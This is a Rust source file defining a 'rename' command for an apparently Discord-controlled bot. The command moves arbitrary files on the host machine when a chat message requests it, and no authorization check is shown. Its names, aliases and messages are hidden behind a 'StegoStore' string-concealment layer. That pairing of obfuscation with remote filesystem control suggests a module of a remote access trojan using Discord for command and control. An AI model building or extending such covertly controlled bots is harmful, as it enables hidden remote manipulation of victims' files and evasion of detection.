use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use std::fs;
use std::path::Path;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

pub struct RenameCommand;

impl RenameCommand {
    fn f(key: &str) -> String { StegoStore::get(StringCategory::Filesystem, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
}

#[async_trait]
impl BotCommand for RenameCommand {
    fn name(&self) -> &str {
        Box::leak(Self::c("MV_NAME").into_boxed_str())
    }
    
    fn description(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::Desc, "MV").into_boxed_str())
    }
    
    fn category(&self) -> &str {
        Box::leak(Self::c("CAT_FS").into_boxed_str())
    }
    
    fn usage(&self) -> &str {
        Box::leak(Self::c("MV_USAGE").into_boxed_str())
    }
    
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![".rename old.txt new.txt", ".rename \"old file.txt\" \"new file.txt\""].into_boxed_slice())
    }
    
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::c("MV_ALIAS1").into_boxed_str()) as &'static str,
            Box::leak(Self::c("MV_ALIAS2").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, args: Arguments) -> Result<()> {
        let parsed_args = Arguments::parse_quoted_args(&args.rest());

        if parsed_args.len() < 2 {
            http.create_message(msg.channel_id.get(), &Self::f("MV_ERR_ARGS")).await?;
            return Ok(());
        }

        let old_path = &parsed_args[0];
        let new_path = &parsed_args[1];

        let old_path_obj = Path::new(old_path);
        let new_path_obj = Path::new(new_path);

        if !old_path_obj.exists() {
            http.create_message(msg.channel_id.get(), &format!("{}: `{}`", Self::f("MV_ERR_SRC"), old_path)).await?;
            return Ok(());
        }

        if new_path_obj.exists() {
            http.create_message(msg.channel_id.get(), &format!(
                    "{}: `{}`",
                    Self::f("MV_ERR_DST"),
                    new_path
                )).await?;
            return Ok(());
        }

        match fs::rename(old_path_obj, new_path_obj) {
            Ok(_) => {
                http.create_message(msg.channel_id.get(), &Self::f("MV_SUCCESS")
                        .replace("{}", old_path)
                        .replace("{}", new_path)
                    ).await?;
            }
            Err(e) => {
                http.create_message(msg.channel_id.get(), &format!(
                        "{} `{}` to `{}`: {}",
                        Self::f("MV_ERR"),
                        old_path, new_path, e
                    )).await?;
            }
        }

        Ok(())
    }
}


